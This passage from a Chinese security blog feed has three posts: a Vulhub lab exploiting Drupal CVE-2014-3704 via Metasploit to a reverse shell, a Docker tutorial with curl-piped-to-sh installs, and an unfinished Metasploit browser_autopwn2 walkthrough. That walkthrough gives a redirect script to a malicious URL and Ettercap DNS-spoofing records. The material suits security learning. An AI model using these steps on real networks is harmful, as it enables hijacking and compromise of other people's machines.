docker-compose//安装docker-compose</span><br></pre></td></tr></table></figure><h2 id="四、下载Vulhub"><a href="#四、下载Vulhub" class="headerlink" title="四、下载Vulhub"></a>四、下载Vulhub</h2><p>安装完成docker和docker-compose后，拉取Vulhub到本地任意目录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>安装完成后，执行<code>docker-compose -v</code>，有返回则说明安装成功。</p><h2 id="五、启动漏洞环境"><a href="#五、启动漏洞环境" class="headerlink" title="五、启动漏洞环境"></a>五、启动漏洞环境</h2><p>docker-compose会自动查找当前目录下的配置文件（默认文件名为<code>docker-compose.yml</code>），并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p><p>在这里演示Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞，进入<code>drupal/CVE-2014-3704/</code>目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /your-Vuln-Path/drupal/CVE-2014-3704/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到Drupal的安装页面，使用默认配置安装即可。</p><p>其中，Mysql数据库名填写<code>drupal</code>，数据库用户名、密码为<code>root</code>，地址为<code>mysql</code>：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803517373.png" alt="1554803517373"></p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803658364.png" alt="1554803658364"></p><p>安装完成后，访问首页：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803788919.png" alt="1554803788919"></p><h2 id="六、漏洞测试"><a href="#六、漏洞测试" class="headerlink" title="六、漏洞测试"></a>六、漏洞测试</h2><h3 id="1-cmsmap扫描cms漏洞"><a href="#1-cmsmap扫描cms漏洞" class="headerlink" title="1. cmsmap扫描cms漏洞"></a>1. cmsmap扫描cms漏洞</h3><ol><li><p>下载cmsmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br></pre></td></tr></table></figure></li><li><p>安装parse模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install parse</span><br></pre></td></tr></table></figure></li><li><p>使用python运行扫描脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmap.py http://192.168.10.18:8080</span><br></pre></td></tr></table></figure><p>得到漏洞详情</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554804365543.png" alt="1554804365543"></p></li></ol><h3 id="2-使用metasploit进行漏洞利用"><a href="#2-使用metasploit进行漏洞利用" class="headerlink" title="2. 使用metasploit进行漏洞利用"></a>2. 使用metasploit进行漏洞利用</h3><ol><li><p>启动metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>搜索可利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2//使用该模块</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807336176.png" alt="1554807336176"></p></li><li><p>设置配置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show options//查看可配置选项</span><br><span class="line">set rhost 192.168.10.18//设置目标IP</span><br><span class="line">set rport 8080//设置目标端口</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807568020.png" alt="1554807568020"></p></li><li><p>执行exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run//开始漏洞利用</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807630335.png" alt="1554807630335"></p></li><li><p>获取反弹shell</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807710493.png" alt="1554807710493"></p></li></ol><h2 id="七、移除环境"><a href="#七、移除环境" class="headerlink" title="七、移除环境"></a>七、移除环境</h2><p>Vulhub中所有环境均为漏洞靶场，在测试结束后，请及时关闭并移除环境，避免被他人恶意利用。</p><p>漏洞测试结束后，返回到<code>drupal/CVE-2014-3704/</code>目录，执行如下命令移除环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p>上述命令会执行如下几个动作：</p><ul><li>关闭正在运行的容器</li><li>删除所有相关容器</li><li>移除NAT（docker-compose在运行的时候会创建一个NAT网段）</li></ul><p>但不会移除编译好的漏洞镜像，下次再执行<code>docker-compose up -d</code>命令，就不需要再次编译相关镜像了。</p><p><strong>参考链接</strong>：</p><p>Vulhub官方文档：<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门&amp;&amp;环境部署实例</title>
      <link href="/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/"/>
      <url>/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、docker介绍"><a href="#一、docker介绍" class="headerlink" title="一、docker介绍"></a>一、docker介绍</h1><p>docker是开源的应用程序容器引擎，使用go语言开发，借助于docker打包用户的应用程序，将这些应用程序包含在容器中，实现虚拟化，容器是完全使用沙箱机制，相互独立，占用资源非常少。</p><a id="more"></a><h1 id="二、docker三大核心概念"><a href="#二、docker三大核心概念" class="headerlink" title="二、docker三大核心概念"></a>二、docker三大核心概念</h1><ul><li><p>镜像</p><ul><li>image, docker镜像就是一个只读的模板，例如一个镜像中可以包含完整的操作系统，里面安装apache/php/mysql等环境，镜像可以创建容器</li></ul></li><li><p>容器</p><ul><li>container，docker利用容器运行程序，容器是从镜像中创建运行的实例，容器可以运行、关闭、删除</li></ul></li><li>仓库<ul><li>repository，集中存放镜像的地方，每个仓库中包含多个镜像，分为私有和公开，dockerHub</li></ul></li></ul><h1 id="三、docker安装"><a href="#三、docker安装" class="headerlink" title="三、docker安装"></a>三、docker安装</h1><h2 id="1-一键安装Docker"><a href="#1-一键安装Docker" class="headerlink" title="1. 一键安装Docker"></a>1. 一键安装Docker</h2><ol><li><p>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure></li><li><p>也可以使用系统自带的包管理工具来安装，比如在Ubuntu下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-手动安装"><a href="#2-手动安装" class="headerlink" title="2.手动安装"></a>2.手动安装</h2><p>常见操作系统安装Docker的方法在文档中均可查阅，这里就不再赘述： <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/</a></p><p><strong>注意</strong>，docker是一个系统服务，所以，安装完成后可能需要手工启动服务：<code>service start docker</code>，否则会出现连接失败的情况。同样，如果docker没有自启动，你也需要手工启动docker服务。如果你是使用一键安装工具安装的docker，则docker会自动启动。</p><h2 id="3-加入docker组"><a href="#3-加入docker组" class="headerlink" title="3. 加入docker组"></a>3. 加入docker组</h2><p>安装完成之后，普通用户每次执行docker命令都需要加上<code>sudo</code> ，所以我们可以加入doker用户组获取操作权限</p><ol><li><p>使用有sudo权限的帐号登录系统</p></li><li><p>创建docker分组，并将相应的用户添加到这个分组里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker your_username</span><br></pre></td></tr></table></figure></li><li><p>退出，然后重新登录，以便让权限生效</p></li></ol><h2 id="4-添加国内镜像仓库"><a href="#4-添加国内镜像仓库" class="headerlink" title="4. 添加国内镜像仓库"></a>4. 添加国内镜像仓库</h2><p>由于官方资源库在国外，我们在拉取镜像资源的时候会很慢。所以，国内的Docker爱好者们就添加了一些国内的镜像（mirror）,方便大家使用。</p><p><strong>国内加速站点</strong></p><ul><li><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a></p></li><li><p><a href="https://c.163yun.com/hub#/m/home/" target="_blank" rel="noopener">网易云</a></p></li><li><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a></p></li></ul><ol><li><p>使用脚本来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>使用命令来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;&lt;your accelerate address&gt;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>以上操作后重启一下 Docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure></li></ol><h1 id="五、docker基本使用"><a href="#五、docker基本使用" class="headerlink" title="五、docker基本使用"></a>五、docker基本使用</h1><h2 id="1-启动docker"><a href="#1-启动docker" class="headerlink" title="1. 启动docker"></a>1. 启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker//centos</span><br><span class="line">server docker start//ubuntu</span><br></pre></td></tr></table></figure><p><strong>查看基本信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker info//当前容器的信息</span><br><span class="line">docker stats//运行容器的进程信息</span><br><span class="line">docker version//版本信息</span><br></pre></td></tr></table></figure><h2 id="2-镜像操作"><a href="#2-镜像操作" class="headerlink" title="2. 镜像操作"></a>2. 镜像操作</h2><p><strong>搜索镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search [关键字]</span><br></pre></td></tr></table></figure><p><strong>拉取镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像全称]:版本标签(可选)</span><br></pre></td></tr></table></figure><p><strong>查看本地镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi []</span><br></pre></td></tr></table></figure><p><strong>导出镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker road &lt; test.tar</span><br></pre></td></tr></table></figure><h2 id="3-容器操作"><a href="#3-容器操作" class="headerlink" title="3. 容器操作"></a>3. 容器操作</h2><p><strong>启动容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --rm --name [容器名字] [镜像名称] [可执行命令]</span><br><span class="line">参数说明：</span><br><span class="line">-d：让容器在后台运行</span><br><span class="line">-P：将容器内部使用的网络端口映射到宿主机</span><br><span class="line">-p：[主机端口:容器端口] 可自定义映射端口</span><br><span class="line">--name：可自定义容器名称</span><br><span class="line">--rm：当容器停止时，会自动删除</span><br></pre></td></tr></table></figure><p><strong>查看运行容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>查看容器端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器内部日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f [容器id/名称] //可以查看容器内部的标准输出</span><br><span class="line">-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [容器id/名称] /bin/bash//推荐使用</span><br><span class="line">docker attach [容器id/名称] //不会在容器中创建进程执行额外的命令，只是附着到容器上</span><br><span class="line">//attach必须登陆到一个已经运行的容器里，如果从这个容器中exit退出的话，就会导致容器停止</span><br></pre></td></tr></table></figure><p><strong>离开容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+P+Q//正常退出不关闭容器</span><br><span class="line">exit//退出之后关闭容器,可以使用下面的流程进行恢复</span><br><span class="line">使用docker restart命令重启容器</span><br><span class="line">使用docker attach命令进入容器</span><br></pre></td></tr></table></figure><p><strong>停止容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>重新开启容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看所有容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器底层信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [容器id/名称]</span><br><span class="line">//删除前必须先停止正在运行的容器</span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import &lt; test.tar</span><br></pre></td></tr></table></figure><p><strong>docker批量删除容器、镜像</strong></p><p>一条命令实现停用并删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p>按条件删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a | awk &apos;/test\/webapp/ &#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><p>按条件删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有打标签</span><br><span class="line">docker rmi `docker images -q | awk &apos;/^&lt;none&gt;/ &#123; print $3 &#125;&apos;`</span><br><span class="line">#镜像名包含关键字</span><br><span class="line">docker rmi --force `docker images | grep keywords | awk &apos;&#123;print $3&#125;&apos;`   </span><br><span class="line">//其中keywords为关键字</span><br></pre></td></tr></table></figure><h2 id="4-文件操作"><a href="#4-文件操作" class="headerlink" title="4. 文件操作"></a>4. 文件操作</h2><p>从主机目录拷贝到容器目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /var/www/example 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure><p>从容器目录拷贝到主机目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /var/www/example</span><br></pre></td></tr></table></figure><h1 id="六、容器部署实例"><a href="#六、容器部署实例" class="headerlink" title="六、容器部署实例"></a>六、容器部署实例</h1><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1. 安装nginx"></a>1. 安装nginx</h3><ul><li>从docker hub上拉取镜像</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx:latest</span><br></pre></td></tr></table></figure><ul><li>托管一些简单的静态内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-nginx -v  $PWD/html:/usr/share/nginx/html:ro -d nginx</span><br><span class="line"> -v $PWD/html:/usr/share/nginx/html：将主机中当前目录下的html挂载到容器的/usr/share/nginx/html</span><br></pre></td></tr></table></figure><ul><li>或者准备自己的配置文件和文件目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br><span class="line">#dockerhub上有详细自定义配置部署说明</span><br><span class="line">-p 80:80：将容器的80端口映射到主机的80端口</span><br><span class="line">--name mynginx：将容器命名为mynginx</span><br><span class="line">-v $PWD/www:/www：将主机中当前目录下的www挂载到容器的/www</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf：将主机中当前目录下的nginx.conf挂载到容器的/etc/nginx/nginx.conf</span><br><span class="line">-v $PWD/logs:/wwwlogs：将主机中当前目录下的logs挂载到容器的/wwwlogs</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果出现以下类似报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:344: starting container process caused &quot;process_linux.go:424: container init caused \&quot;rootfs_linux.go:58: mounting \\\&quot;/opt/nginx/conf/nginx.conf\\\&quot; to rootfs \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged\\\&quot; at \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged/etc/nginx/nginx.conf\\\&quot; caused \\\&quot;not a directory\\\&quot;\&quot;&quot;: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.</span><br></pre></td></tr></table></figure><p>是因为没提前创建好挂载目录和配置文件导致conf/nginx.conf 自动创建成目录，删除并创建nginx.conf配置文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll conf/</span><br><span class="line">rm -r conf/nginx.conf</span><br><span class="line">touch conf/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>查看运行容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-bde19eff6c1fd6ea.png" alt="当前正在运行的容器"></p><h3 id="2-安装Lamp环境"><a href="#2-安装Lamp环境" class="headerlink" title="2. 安装Lamp环境"></a>2. 安装Lamp环境</h3><p>拉取一个lamp镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fauria/lamp</span><br></pre></td></tr></table></figure><p>创建lamp目录&amp;挂载路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/lamp &amp;&amp; cd ~/lamp</span><br><span class="line">mkdir www logs</span><br></pre></td></tr></table></figure><p>创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 80:80 -v /opt/lamp/www:/var/www/html -v /opt/lamp/logs/:/var/log/httpd --name my-lamp-container fauria/lamp</span><br></pre></td></tr></table></figure><p>查看是否启动成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-1fab64e3d8195ff5.png" alt="STATUS为UP说明启动成功"></p><p>查看所有容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>进入一个已经在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其中字符串为容器ID</span><br><span class="line">docker exec -it d27bd3998ad9 /bin/bash</span><br></pre></td></tr></table></figure><p>删除容器删除前先停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop  d27b  &amp; docker rm d27b</span><br></pre></td></tr></table></figure><h1 id="七、最后"><a href="#七、最后" class="headerlink" title="七、最后"></a>七、最后</h1><p>本文只是起到docker的入门作用，如果想深入学习</p><p>以下推荐几个dokcer在线学习网站</p><p>[Docker 教程 | 菜鸟教程]<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/docker/docker-tutorial.html</a></p><p>[Docker 入门教程|阮一峰的网络日志]<a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit利用-浏览器自动攻击</title>
      <link href="/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。</p><a id="more"></a><h2 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h2><ul><li><p>本地局域网络</p></li><li><p>Kali</p></li><li><p>Windows Server 2003 / xp </p></li></ul><h2 id="三、使用工具"><a href="#三、使用工具" class="headerlink" title="三、使用工具"></a>三、使用工具</h2><ul><li><p>Metasploit</p></li><li><p>Ettercap</p></li></ul><h2 id="四、Exp"><a href="#四、Exp" class="headerlink" title="四、Exp"></a>四、Exp</h2><p>browser_autopwn2</p><h2 id="五、目的"><a href="#五、目的" class="headerlink" title="五、目的"></a>五、目的</h2><p>如果在同一局域网，目标机器上没有可成功利用的端口时，我们可以尝试进行浏览器攻击。首先，在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点，访问该站点页面会自动跳转至我们构造好的恶意URL上，然后获得反弹shell，这样就能达到获取权限目的。</p><h2 id="六、服务端准备"><a href="#六、服务端准备" class="headerlink" title="六、服务端准备"></a>六、服务端准备</h2><h3 id="1-启动MSF"><a href="#1-启动MSF" class="headerlink" title="1. 启动MSF"></a>1. 启动MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start//启动msf框架所依赖的数据库</span><br><span class="line">msfconsole//启动msfconsole</span><br></pre></td></tr></table></figure><h3 id="2-加载Exp"><a href="#2-加载Exp" class="headerlink" title="2. 加载Exp"></a>2. 加载Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2//搜索browser_autopwn2模块</span><br><span class="line">use auxiliary/server/browser_autopwn2//使用该模块</span><br><span class="line">show options//查看参数，可默认无需修改</span><br><span class="line">set//查看设置内容</span><br><span class="line">run//启动模块</span><br></pre></td></tr></table></figure><p>等待出现URL，和 Server started</p><h3 id="3-构造恶意URL"><a href="#3-构造恶意URL" class="headerlink" title="3. 构造恶意URL"></a>3. 构造恶意URL</h3><p>在Apache中写上自动跳转的代码，向恶意URL上跳转</p><p>这里采用javascript实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 以下方式定时跳转</span></span><br><span class="line"><span class="undefined">setTimeout("javascript:location.href='http://192.168.10.3:8080/Y3JY6DI6gql5iSu'", 5000); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-启动站点服务"><a href="#5-启动站点服务" class="headerlink" title="5.启动站点服务"></a>5.启动站点服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><h2 id="七、攻击客户端"><a href="#七、攻击客户端" class="headerlink" title="七、攻击客户端"></a>七、攻击客户端</h2><h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1. DNS欺骗"></a>1. DNS欺骗</h3><p><strong>使用Ettercap</strong></p><ol><li><p>打开Ettercap的 DNS文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>添加欺骗的A记录和PTR（反向）记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.*.comA192.168.10.3</span><br><span class="line">www.*.comPTR192.168.10.3</span><br></pre></td></tr></table></figure></li><li><p>kali中输入ettercap -G 